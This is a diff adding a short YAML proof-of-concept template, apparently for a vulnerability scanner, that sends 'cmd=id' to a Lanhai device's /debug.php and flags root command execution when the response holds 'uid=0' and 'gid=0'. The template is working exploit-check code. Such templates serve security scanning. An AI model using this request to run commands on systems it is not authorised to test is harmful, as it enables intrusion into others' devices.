@@ -1,0 +1,17 @@
+name: poc-yaml-lanhai-debug-RCE
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            method: POST
+            path: /debug.php
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: cmd=id
+        expression: response.status == 200 && response.body.bcontains(b"uid=0") && response.body.bcontains(b"gid=0")
+expression: r0()
+detail:
+    author: Jaky(jakylin)
+    links:
+        - https://www.luomiweixiong.com
